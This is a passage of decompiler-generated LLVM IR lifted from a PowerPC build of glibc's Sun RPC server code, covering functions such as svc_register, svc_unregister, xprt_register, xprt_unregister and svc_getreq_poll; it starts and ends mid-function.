dec_label_pc_10012a70.lr.ph:                      ; preds = %entry
  %v0_10012a70.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10012a70

dec_label_pc_10012a70:                            ; preds = %dec_label_pc_10012a70.lr.ph, %dec_label_pc_10012aa4
  %v0_10012a70 = phi i32 [ %v0_10012a70.pre, %dec_label_pc_10012a70.lr.ph ], [ %v1_10012aa4, %dec_label_pc_10012aa4 ]
  %v1_10012a70 = inttoptr i32 %v0_10012a70 to i32*
  %v2_10012a70 = load i32, i32* %v1_10012a70, align 4
  store i32 %v2_10012a70, i32* @r31, align 4
  %v1_10012a9011 = call i32 @ffs(i32 %v2_10012a70)
  %v3_10012a9412 = icmp eq i32 %v1_10012a9011, 0
  %v0_10012a9813 = load i32, i32* @r28, align 4
  %v2_10012a9814 = add i32 %v1_10012a9011, -1
  %v1_10012a9c15 = add i32 %v2_10012a9814, %v0_10012a9813
  br i1 %v3_10012a9412, label %dec_label_pc_10012aa4, label %dec_label_pc_10012a78

dec_label_pc_10012a78:                            ; preds = %dec_label_pc_10012a70, %dec_label_pc_10012a78
  %v1_10012a9c16 = phi i32 [ %v1_10012a9c, %dec_label_pc_10012a78 ], [ %v1_10012a9c15, %dec_label_pc_10012a70 ]
  store i32 268511868, i32* @lr, align 4
  %v1_10012a78 = call i32 @svc_getreq_common(i32 %v1_10012a9c16)
  %v0_10012a7c = load i32, i32* @r30, align 4
  %v1_10012a7c = add i32 %v0_10012a7c, -1
  %v2_10012a84 = urem i32 %v1_10012a7c, 64
  %v3_10012a84 = shl i32 1, %v2_10012a84
  %v0_10012a88 = load i32, i32* @r31, align 4
  %v2_10012a88 = xor i32 %v3_10012a84, %v0_10012a88
  store i32 %v2_10012a88, i32* @r31, align 4
  %v1_10012a90 = call i32 @ffs(i32 %v2_10012a88)
  %v3_10012a94 = icmp eq i32 %v1_10012a90, 0
  %v0_10012a98 = load i32, i32* @r28, align 4
  %v2_10012a98 = add i32 %v1_10012a90, -1
  %v1_10012a9c = add i32 %v2_10012a98, %v0_10012a98
  br i1 %v3_10012a94, label %dec_label_pc_10012aa4, label %dec_label_pc_10012a78

dec_label_pc_10012aa4:                            ; preds = %dec_label_pc_10012a78, %dec_label_pc_10012a70
  %v0_10012a98.lcssa = phi i32 [ %v0_10012a9813, %dec_label_pc_10012a70 ], [ %v0_10012a98, %dec_label_pc_10012a78 ]
  %v1_10012a9c.lcssa = phi i32 [ %v1_10012a9c15, %dec_label_pc_10012a70 ], [ %v1_10012a9c, %dec_label_pc_10012a78 ]
  %v0_10012aa4 = load i32, i32* @r29, align 4
  %v1_10012aa4 = add i32 %v0_10012aa4, 4
  store i32 %v1_10012aa4, i32* @r29, align 4
  %v1_10012aa8 = add i32 %v0_10012a98.lcssa, 32
  store i32 %v1_10012aa8, i32* @r28, align 4
  %v1_10012aac = load i32, i32* @r27, align 4
  %v2_10012aac = icmp slt i32 %v1_10012aa8, %v1_10012aac
  br i1 %v2_10012aac, label %dec_label_pc_10012a70, label %dec_label_pc_10012ab4

dec_label_pc_10012ab4:                            ; preds = %dec_label_pc_10012aa4, %entry
  %v0_10012ac4 = phi i32 [ %v0_10012a60, %entry ], [ %v1_10012a9c.lcssa, %dec_label_pc_10012aa4 ]
  ret i32 %v0_10012ac4

; uselistorder directives
  uselistorder i32 %v1_10012aa8, { 1, 0 }
  uselistorder i32 %v1_10012aa4, { 1, 0 }
  uselistorder i32 %v2_10012a88, { 1, 0 }
  uselistorder i32 (i32)* @ffs, { 1, 0 }
  uselistorder label %dec_label_pc_10012a78, { 1, 0 }
  uselistorder label %dec_label_pc_10012a70, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 %arg1, i32* %r11.global-to-local, align 4
  %v2_10012ad8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_10012ad8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r10, align 4
  store i32 0, i32* %stack_var_-136, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  store i32 31, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge

dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge: ; preds = %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge.dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge_crit_edge, %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge.lr.ph
  %v1_10012af0.pre = phi i32 [ %v2_10012ad8, %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge.lr.ph ], [ %v1_10012af0.pre.pre, %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge.dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge_crit_edge ]
  %v0_10012af0.pre = phi i32 [ 0, %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge.lr.ph ], [ %v0_10012af0.pre.pre, %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge.dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge_crit_edge ]
  %v1_10012af422 = phi i32 [ 4, %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge.lr.ph ], [ %v1_10012af4, %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge.dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge_crit_edge ]
  %v3_10012af0 = add i32 %v1_10012af0.pre, %v1_10012af422
  %v4_10012af0 = inttoptr i32 %v3_10012af0 to i32*
  store i32 %v0_10012af0.pre, i32* %v4_10012af0, align 4
  %v0_10012af4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012af8 = add i32 %v0_10012af4, 1
  store i32 %v1_10012af8, i32* %r9.global-to-local, align 4
  %v0_10012afc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012afc = add i32 %v0_10012afc, -1
  store i32 %v1_10012afc, i32* %ctr.global-to-local, align 4
  %v2_10012afc = icmp eq i32 %v1_10012afc, 0
  br i1 %v2_10012afc, label %dec_label_pc_10012b00, label %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge.dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge_crit_edge

dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge.dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge_crit_edge: ; preds = %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge
  %v1_10012af4 = mul i32 %v0_10012af4, 4
  %v0_10012af0.pre.pre = load i32, i32* @r10, align 4
  %v1_10012af0.pre.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge

dec_label_pc_10012b00:                            ; preds = %dec_label_pc_10012af0.dec_label_pc_10012af0_crit_edge
  %phitmp23 = inttoptr i32 %v1_10012af8 to i32*
  %v0_10012b00.pre.pre = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10012b00.pre.pre, i32* %stack_var_-136, align 4
  store i32 268512008, i32* @lr, align 4
  %v2_10012b04 = call i32 @svc_getreqset(i32* %phitmp23)
  store i32 %v2_10012b04, i32* %r3.global-to-local, align 4
  ret i32 %v2_10012b04

; uselistorder directives
  uselistorder i32 %v1_10012afc, { 1, 0 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_10012b20 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012b20, i32* @r5, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268512056, i32* @lr, align 4
  %v1_10012b34 = call i32 @svc_find(i32 %v2_10012b20)
  store i32 %v1_10012b34, i32* @r31, align 4
  %v3_10012b38 = icmp eq i32 %v1_10012b34, 0
  br i1 %v3_10012b38, label %dec_label_pc_10012b7c, label %dec_label_pc_10012b40

dec_label_pc_10012b40:                            ; preds = %entry
  %v3_10012b40 = load i32, i32* %stack_var_-40, align 4
  %v1_10012b44 = inttoptr i32 %v1_10012b34 to i32*
  %v2_10012b44 = load i32, i32* %v1_10012b44, align 4
  store i32 %v2_10012b44, i32* @r30, align 4
  %v3_10012b48 = icmp eq i32 %v3_10012b40, 0
  br i1 %v3_10012b48, label %dec_label_pc_10012b50, label %dec_label_pc_10012b5c

dec_label_pc_10012b50:                            ; preds = %dec_label_pc_10012b40
  store i32 268512084, i32* @lr, align 4
  %v0_10012b50 = call i32 @__rpc_thread_variables()
  %v0_10012b54 = load i32, i32* @r30, align 4
  %v2_10012b54 = add i32 %v0_10012b50, 184
  %v3_10012b54 = inttoptr i32 %v2_10012b54 to i32*
  store i32 %v0_10012b54, i32* %v3_10012b54, align 4
  br label %dec_label_pc_10012b60

dec_label_pc_10012b5c:                            ; preds = %dec_label_pc_10012b40
  %v2_10012b5c = inttoptr i32 %v3_10012b40 to i32*
  store i32 %v2_10012b44, i32* %v2_10012b5c, align 4
  br label %dec_label_pc_10012b60

dec_label_pc_10012b60:                            ; preds = %dec_label_pc_10012b50, %dec_label_pc_10012b5c
  %v0_10012b64 = load i32, i32* @r31, align 4
  store i32 %v0_10012b64, i32* @r3, align 4
  %v2_10012b68 = inttoptr i32 %v0_10012b64 to i32*
  store i32 0, i32* %v2_10012b68, align 4
  store i32 268512112, i32* @lr, align 4
  %v0_10012b6c = call i32 @free()
  %v0_10012b70 = load i32, i32* @r29, align 4
  %v0_10012b74 = load i32, i32* @r28, align 4
  store i32 268512124, i32* @lr, align 4
  %v2_10012b78 = call i32 @__GI_pmap_unset(i32 %v0_10012b70, i32 %v0_10012b74)
  br label %dec_label_pc_10012b7c

dec_label_pc_10012b7c:                            ; preds = %entry, %dec_label_pc_10012b60
  %v0_10012b8c = phi i32 [ 0, %entry ], [ %v2_10012b78, %dec_label_pc_10012b60 ]
  ret i32 %v0_10012b8c

; uselistorder directives
  uselistorder label %dec_label_pc_10012b7c, { 1, 0 }
  uselistorder label %dec_label_pc_10012b60, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268512176, i32* @lr, align 4
  %v0_10012bac1 = call i32 @__rpc_thread_variables()
  %v1_10012bb02 = add i32 %v0_10012bac1, 184
  %v2_10012bb03 = inttoptr i32 %v1_10012bb02 to i32*
  %v3_10012bb04 = load i32, i32* %v2_10012bb03, align 4
  %v3_10012bb47 = icmp eq i32 %v3_10012bb04, 0
  br i1 %v3_10012bb47, label %dec_label_pc_10012bbc, label %dec_label_pc_10012ba0

dec_label_pc_10012ba0:                            ; preds = %entry, %dec_label_pc_10012ba0
  %v3_10012bb08 = phi i32 [ %v3_10012bb0, %dec_label_pc_10012ba0 ], [ %v3_10012bb04, %entry ]
  %v1_10012ba0 = add i32 %v3_10012bb08, 8
  %v2_10012ba0 = inttoptr i32 %v1_10012ba0 to i32*
  %v3_10012ba0 = load i32, i32* %v2_10012ba0, align 4
  %v1_10012ba4 = add i32 %v3_10012bb08, 4
  %v2_10012ba4 = inttoptr i32 %v1_10012ba4 to i32*
  %v3_10012ba4 = load i32, i32* %v2_10012ba4, align 4
  store i32 268512172, i32* @lr, align 4
  %v3_10012ba8 = call i32 @svc_unregister(i32 %v3_10012ba4, i32 %v3_10012ba0, i32 %v3_10012bb08)
  store i32 268512176, i32* @lr, align 4
  %v0_10012bac = call i32 @__rpc_thread_variables()
  %v1_10012bb0 = add i32 %v0_10012bac, 184
  %v2_10012bb0 = inttoptr i32 %v1_10012bb0 to i32*
  %v3_10012bb0 = load i32, i32* %v2_10012bb0, align 4
  %v3_10012bb4 = icmp eq i32 %v3_10012bb0, 0
  br i1 %v3_10012bb4, label %dec_label_pc_10012bbc, label %dec_label_pc_10012ba0

dec_label_pc_10012bbc:                            ; preds = %dec_label_pc_10012ba0, %entry
  %v0_10012bac.lcssa = phi i32 [ %v0_10012bac1, %entry ], [ %v0_10012bac, %dec_label_pc_10012ba0 ]
  ret i32 %v0_10012bac.lcssa

; uselistorder directives
  uselistorder i32 %v3_10012bb0, { 1, 0 }
  uselistorder i32 %v3_10012bb08, { 2, 0, 1 }
  uselistorder i32 268512176, { 1, 0 }
  uselistorder label %dec_label_pc_10012ba0, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r26, align 4
  %v2_10012be8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012be8, i32* @r5, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* @r27, align 4
  store i32 268512256, i32* @lr, align 4
  %v3_10012bfc = call i32 @svc_find(i32 %arg2)
  %v3_10012c00 = icmp eq i32 %v3_10012bfc, 0
  store i32 16, i32* @r3, align 4
  br i1 %v3_10012c00, label %dec_label_pc_10012c1c, label %dec_label_pc_10012c0c

dec_label_pc_10012c0c:                            ; preds = %entry
  %v1_10012c0c = add i32 %v3_10012bfc, 12
  %v2_10012c0c = inttoptr i32 %v1_10012c0c to i32*
  %v3_10012c0c = load i32, i32* %v2_10012c0c, align 4
  %v1_10012c10 = load i32, i32* @r28, align 4
  %v4_10012c10 = icmp eq i32 %v3_10012c0c, %v1_10012c10
  br i1 %v4_10012c10, label %dec_label_pc_10012c44, label %dec_label_pc_10012c6c

dec_label_pc_10012c1c:                            ; preds = %entry
  store i32 268512288, i32* @lr, align 4
  %v0_10012c1c = call i32 @malloc()
  store i32 %v0_10012c1c, i32* @r31, align 4
  %v3_10012c20 = icmp eq i32 %v0_10012c1c, 0
  br i1 %v3_10012c20, label %dec_label_pc_10012c6c, label %dec_label_pc_10012c28

dec_label_pc_10012c28:                            ; preds = %dec_label_pc_10012c1c
  %v0_10012c28 = load i32, i32* @r28, align 4
  %v2_10012c28 = add i32 %v0_10012c1c, 12
  %v3_10012c28 = inttoptr i32 %v2_10012c28 to i32*
  store i32 %v0_10012c28, i32* %v3_10012c28, align 4
  %v0_10012c2c = load i32, i32* @r30, align 4
  %v1_10012c2c = load i32, i32* @r31, align 4
  %v2_10012c2c = add i32 %v1_10012c2c, 4
  %v3_10012c2c = inttoptr i32 %v2_10012c2c to i32*
  store i32 %v0_10012c2c, i32* %v3_10012c2c, align 4
  %v0_10012c30 = load i32, i32* @r29, align 4
  %v1_10012c30 = load i32, i32* @r31, align 4
  %v2_10012c30 = add i32 %v1_10012c30, 8
  %v3_10012c30 = inttoptr i32 %v2_10012c30 to i32*
  store i32 %v0_10012c30, i32* %v3_10012c30, align 4
  store i32 268512312, i32* @lr, align 4
  %v0_10012c34 = call i32 @__rpc_thread_variables()
  %v1_10012c38 = add i32 %v0_10012c34, 184
  %v2_10012c38 = inttoptr i32 %v1_10012c38 to i32*
  %v3_10012c38 = load i32, i32* %v2_10012c38, align 4
  %v1_10012c3c = load i32, i32* @r31, align 4
  %v2_10012c3c = inttoptr i32 %v1_10012c3c to i32*
  store i32 %v3_10012c38, i32* %v2_10012c3c, align 4
  %v0_10012c40 = load i32, i32* @r31, align 4
  store i32 %v0_10012c40, i32* %v2_10012c38, align 4
  br label %dec_label_pc_10012c44

dec_label_pc_10012c44:                            ; preds = %dec_label_pc_10012c0c, %dec_label_pc_10012c28
  %v0_10012c44 = load i32, i32* @r27, align 4
  %v3_10012c44 = icmp eq i32 %v0_10012c44, 0
  br i1 %v3_10012c44, label %dec_label_pc_10012c70, label %dec_label_pc_10012c5c

dec_label_pc_10012c5c:                            ; preds = %dec_label_pc_10012c44
  %v0_10012c4c = load i32, i32* @r29, align 4
  %v0_10012c48 = load i32, i32* @r30, align 4
  %v0_10012c5c = load i32, i32* @r26, align 4
  %v1_10012c5c = add i32 %v0_10012c5c, 4
  %v2_10012c5c = inttoptr i32 %v1_10012c5c to i16*
  %v3_10012c5c = load i16, i16* %v2_10012c5c, align 2
  %v4_10012c5c = zext i16 %v3_10012c5c to i32
  store i32 268512356, i32* @lr, align 4
  %v4_10012c60 = call i32 @pmap_set(i32 %v0_10012c48, i32 %v0_10012c4c, i32 %v0_10012c44, i32 %v4_10012c5c)
  br label %dec_label_pc_10012c70

dec_label_pc_10012c6c:                            ; preds = %dec_label_pc_10012c0c, %dec_label_pc_10012c1c
  br label %dec_label_pc_10012c70

dec_label_pc_10012c70:                            ; preds = %dec_label_pc_10012c44, %dec_label_pc_10012c5c, %dec_label_pc_10012c6c
  %v0_10012c70 = phi i32 [ 1, %dec_label_pc_10012c44 ], [ %v4_10012c60, %dec_label_pc_10012c5c ], [ 0, %dec_label_pc_10012c6c ]
  ret i32 %v0_10012c70

; uselistorder directives
  uselistorder i32 184, { 1, 5, 0, 3, 2, 4 }
  uselistorder i32 (i32)* @svc_find, { 1, 0 }
  uselistorder label %dec_label_pc_10012c70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012c6c, { 1, 0 }
  uselistorder label %dec_label_pc_10012c44, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  %v2_10012c9c = load i32, i32* %arg1, align 4
  store i32 %v2_10012c9c, i32* @r31, align 4
  store i32 268512420, i32* @lr, align 4
  %v0_10012ca0 = call i32 @_rpc_dtablesize()
  store i32 %v0_10012ca0, i32* %r3.global-to-local, align 4
  %v2_10012ca4 = icmp slt i32 %v2_10012c9c, %v0_10012ca0
  br i1 %v2_10012ca4, label %dec_label_pc_10012cac, label %dec_label_pc_10012d30

dec_label_pc_10012cac:                            ; preds = %entry
  store i32 268512432, i32* @lr, align 4
  %v0_10012cac = call i32 @__rpc_thread_variables()
  store i32 %v0_10012cac, i32* %r3.global-to-local, align 4
  %v1_10012cb0 = mul i32 %v2_10012c9c, 4
  %v1_10012cb4 = add i32 %v0_10012cac, 180
  %v2_10012cb4 = inttoptr i32 %v1_10012cb4 to i32*
  %v3_10012cb4 = load i32, i32* %v2_10012cb4, align 4
  %v2_10012cb8 = add i32 %v3_10012cb4, %v1_10012cb0
  %v3_10012cb8 = inttoptr i32 %v2_10012cb8 to i32*
  %v4_10012cb8 = load i32, i32* %v3_10012cb8, align 4
  %v1_10012cbc = load i32, i32* @r30, align 4
  %v4_10012cbc = icmp eq i32 %v4_10012cb8, %v1_10012cbc
  br i1 %v4_10012cbc, label %dec_label_pc_10012cc4, label %dec_label_pc_10012d30

dec_label_pc_10012cc4:                            ; preds = %dec_label_pc_10012cac
  %v2_10012cc4 = icmp sgt i32 %v2_10012c9c, 1023
  store i32 0, i32* %v3_10012cb8, align 4
  br i1 %v2_10012cc4, label %dec_label_pc_10012cf4, label %dec_label_pc_10012cd4

dec_label_pc_10012cd4:                            ; preds = %dec_label_pc_10012cc4
  store i32 268512472, i32* @lr, align 4
  %v0_10012cd4 = load i32, i32* %r3.global-to-local, align 4
  %v2_10012cd4 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_10012cd4, i32 %v1_10012cb0)
  store i32 %v2_10012cd4, i32* %r3.global-to-local, align 4
  %v1_10012cd8 = call i32 @__asm_rlwinm(i32 %v2_10012c9c, i32 29, i32 3, i32 29)
  store i32 %v1_10012cd8, i32* @r10, align 4
  %v2_10012cdc = add i32 %v1_10012cd8, %v2_10012cd4
  %v3_10012cdc = inttoptr i32 %v2_10012cdc to i32*
  %v4_10012cdc = load i32, i32* %v3_10012cdc, align 4
  %v1_10012ce0 = urem i32 %v2_10012c9c, 32
  %v3_10012ce8 = shl i32 -2, %v1_10012ce0
  %v4_10012ce8 = sub nsw i32 32, %v1_10012ce0
  %v5_10012ce8 = lshr i32 -2, %v4_10012ce8
  %v6_10012ce8 = or i32 %v5_10012ce8, %v3_10012ce8
  %v2_10012cec = and i32 %v4_10012cdc, %v6_10012ce8
  store i32 %v2_10012cec, i32* %v3_10012cdc, align 4
  br label %dec_label_pc_10012cf4

dec_label_pc_10012cf4:                            ; preds = %dec_label_pc_10012cc4, %dec_label_pc_10012cd4
  store i32 0, i32* @r30, align 4
  store i32 268512548, i32* @lr, align 4
  %v0_10012d201 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10012d201, i32* %r3.global-to-local, align 4
  %v1_10012d242 = inttoptr i32 %v0_10012d201 to i32*
  %v2_10012d243 = load i32, i32* %v1_10012d242, align 4
  %v0_10012d284 = load i32, i32* @r30, align 4
  %v2_10012d285 = icmp slt i32 %v0_10012d284, %v2_10012d243
  br i1 %v2_10012d285, label %dec_label_pc_10012cfc, label %dec_label_pc_10012d30

dec_label_pc_10012cfc:                            ; preds = %dec_label_pc_10012cf4, %dec_label_pc_10012d20.backedge
  store i32 268512512, i32* @lr, align 4
  %v0_10012cfc = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_10012cfc, i32* %r3.global-to-local, align 4
  %v0_10012d00 = load i32, i32* @r30, align 4
  %v1_10012d00 = mul i32 %v0_10012d00, 8
  %v1_10012d04 = inttoptr i32 %v0_10012cfc to i32*
  %v2_10012d04 = load i32, i32* %v1_10012d04, align 4
  store i32 %v2_10012d04, i32* %r3.global-to-local, align 4
  %v1_10012d08 = add i32 %v0_10012d00, 1
  store i32 %v1_10012d08, i32* @r30, align 4
  %v2_10012d0c = add i32 %v2_10012d04, %v1_10012d00
  %v3_10012d0c = inttoptr i32 %v2_10012d0c to i32*
  %v4_10012d0c = load i32, i32* %v3_10012d0c, align 4
  %v4_10012d10 = icmp eq i32 %v4_10012d0c, %v2_10012c9c
  br i1 %v4_10012d10, label %dec_label_pc_10012d18, label %dec_label_pc_10012d20.backedge

dec_label_pc_10012d18:                            ; preds = %dec_label_pc_10012cfc
  store i32 -1, i32* %v3_10012d0c, align 4
  br label %dec_label_pc_10012d20.backedge

dec_label_pc_10012d20.backedge:                   ; preds = %dec_label_pc_10012d18, %dec_label_pc_10012cfc
  store i32 268512548, i32* @lr, align 4
  %v0_10012d20 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_10012d20, i32* %r3.global-to-local, align 4
  %v1_10012d24 = inttoptr i32 %v0_10012d20 to i32*
  %v2_10012d24 = load i32, i32* %v1_10012d24, align 4
  %v0_10012d28 = load i32, i32* @r30, align 4
  %v2_10012d28 = icmp slt i32 %v0_10012d28, %v2_10012d24
  br i1 %v2_10012d28, label %dec_label_pc_10012cfc, label %dec_label_pc_10012d30

dec_label_pc_10012d30:                            ; preds = %dec_label_pc_10012d20.backedge, %dec_label_pc_10012cf4, %dec_label_pc_10012cac, %entry
  %v0_10012d40 = phi i32 [ %v0_10012cac, %dec_label_pc_10012cac ], [ %v0_10012ca0, %entry ], [ %v0_10012d201, %dec_label_pc_10012cf4 ], [ %v0_10012d20, %dec_label_pc_10012d20.backedge ]
  ret i32 %v0_10012d40

; uselistorder directives
  uselistorder i32 %v0_10012d00, { 1, 0 }
  uselistorder i32 %v2_10012c9c, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 8, 4, 5, 6, 7, 0 }
  uselistorder i32 268512548, { 1, 0 }
  uselistorder label %dec_label_pc_10012cfc, { 1, 0 }
  uselistorder label %dec_label_pc_10012cf4, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r27, align 4
  store i32 0, i32* @r30, align 4
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10012db0

dec_label_pc_10012d68:                            ; preds = %dec_label_pc_10012db0
  %v3_10012d68 = inttoptr i32 %v2_10012dc0 to i32*
  %v4_10012d68 = load i32, i32* %v3_10012d68, align 4
  store i32 %v4_10012d68, i32* @r31, align 4
  %v3_10012d6c = icmp eq i32 %v4_10012d68, -1
  br i1 %v3_10012d6c, label %dec_label_pc_10012dac, label %dec_label_pc_10012d74

dec_label_pc_10012d74:                            ; preds = %dec_label_pc_10012d68
  %v1_10012d74 = add i32 %v2_10012dc0, 6
  %v2_10012d74 = inttoptr i32 %v1_10012d74 to i16*
  %v3_10012d74 = load i16, i16* %v2_10012d74, align 2
  %v3_10012d78 = icmp eq i16 %v3_10012d74, 0
  br i1 %v3_10012d78, label %dec_label_pc_10012dac, label %dec_label_pc_10012d84

dec_label_pc_10012d84:                            ; preds = %dec_label_pc_10012d74
  %v1_10012d7c = and i16 %v3_10012d74, 32
  %v3_10012d7c = icmp eq i16 %v1_10012d7c, 0
  %v1_10012d88 = add i32 %v0_10012dbc, 1
  store i32 %v1_10012d88, i32* @r29, align 4
  br i1 %v3_10012d7c, label %dec_label_pc_10012da8, label %dec_label_pc_10012d90

dec_label_pc_10012d90:                            ; preds = %dec_label_pc_10012d84
  store i32 268512660, i32* @lr, align 4
  %v0_10012d90 = call i32 @__rpc_thread_variables()
  %v0_10012d94 = load i32, i32* @r31, align 4
  %v1_10012d94 = mul i32 %v0_10012d94, 4
  %v1_10012d98 = add i32 %v0_10012d90, 180
  %v2_10012d98 = inttoptr i32 %v1_10012d98 to i32*
  %v3_10012d98 = load i32, i32* %v2_10012d98, align 4
  %v2_10012d9c = add i32 %v3_10012d98, %v1_10012d94
  %v3_10012d9c = inttoptr i32 %v2_10012d9c to i32*
  %v4_10012d9c = load i32, i32* %v3_10012d9c, align 4
  store i32 ptrtoint (i32* @global_var_10012da4.512 to i32), i32* @lr, align 4
  %v2_10012da0 = inttoptr i32 %v4_10012d9c to i32*
  %v3_10012da0 = call i32 @xprt_unregister(i32* %v2_10012da0, i32 %v3_10012d98)
  br label %dec_label_pc_10012dac

dec_label_pc_10012da8:                            ; preds = %dec_label_pc_10012d84
  store i32 268512684, i32* @lr, align 4
  %v1_10012da8 = call i32 @svc_getreq_common(i32 %v4_10012d68)
  br label %dec_label_pc_10012dac

dec_label_pc_10012dac:                            ; preds = %dec_label_pc_10012d74, %dec_label_pc_10012d68, %dec_label_pc_10012d90, %dec_label_pc_10012da8
  %v0_10012dac = load i32, i32* @r30, align 4
  %v1_10012dac = add i32 %v0_10012dac, 1
  store i32 %v1_10012dac, i32* @r30, align 4
  br label %dec_label_pc_10012db0

dec_label_pc_10012db0:                            ; preds = %entry, %dec_label_pc_10012dac
  store i32 268512692, i32* @lr, align 4
  %v0_10012db0 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_10012db4 = load i32, i32* @r30, align 4
  %v1_10012db4 = mul i32 %v0_10012db4, 8
  %v1_10012db8 = inttoptr i32 %v0_10012db0 to i32*
  %v2_10012db8 = load i32, i32* %v1_10012db8, align 4
  %v0_10012dbc = load i32, i32* @r29, align 4
  %v1_10012dbc = load i32, i32* @r27, align 4
  %v2_10012dbc = icmp slt i32 %v0_10012dbc, %v1_10012dbc
  %v0_10012dc0 = load i32, i32* @r28, align 4
  %v2_10012dc0 = add i32 %v0_10012dc0, %v1_10012db4
  %v2_10012dc4 = icmp slt i32 %v0_10012db4, %v2_10012db8
  %brmerge.demorgan = and i1 %v2_10012dc4, %v2_10012dbc
  br i1 %brmerge.demorgan, label %dec_label_pc_10012d68, label %dec_label_pc_10012dd0

dec_label_pc_10012dd0:                            ; preds = %dec_label_pc_10012db0
  ret i32 %v0_10012db0

; uselistorder directives
  uselistorder i32 %v2_10012dc0, { 1, 0 }
  uselistorder i32 %v0_10012dbc, { 1, 0 }
  uselistorder i32 %v0_10012db4, { 1, 0 }
  uselistorder i32 %v3_10012d98, { 1, 0 }
  uselistorder i32 (i32)* @svc_getreq_common, { 1, 0 }
  uselistorder label %dec_label_pc_10012db0, { 1, 0 }
  uselistorder label %dec_label_pc_10012dac, { 3, 2, 0, 1 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268512764, i32* @lr, align 4
  %v0_10012df8 = call i32 @__rpc_thread_variables()
  store i32 %v0_10012df8, i32* %r3.global-to-local, align 4
  %v1_10012dfc = add i32 %v0_10012df8, 180
  %v2_10012dfc = inttoptr i32 %v1_10012dfc to i32*
  %v3_10012dfc = load i32, i32* %v2_10012dfc, align 4
  store i32 %v0_10012df8, i32* @r31, align 4
  %v0_10012e04 = load i32, i32* @r30, align 4
  %v1_10012e04 = inttoptr i32 %v0_10012e04 to i32*
  %v2_10012e04 = load i32, i32* %v1_10012e04, align 4
  %v3_10012e08 = icmp eq i32 %v3_10012dfc, 0
  br i1 %v3_10012e08, label %dec_label_pc_10012e10, label %dec_label_pc_10012e28

dec_label_pc_10012e10:                            ; preds = %entry
  store i32 268512788, i32* @lr, align 4
  %v0_10012e10 = call i32 @_rpc_dtablesize()
  %v1_10012e14 = mul i32 %v0_10012e10, 4
  store i32 %v1_10012e14, i32* @r3, align 4
  store i32 268512796, i32* @lr, align 4
  %v0_10012e18 = call i32 @malloc()
  store i32 %v0_10012e18, i32* %r3.global-to-local, align 4
  %v3_10012e1c = icmp eq i32 %v0_10012e18, 0
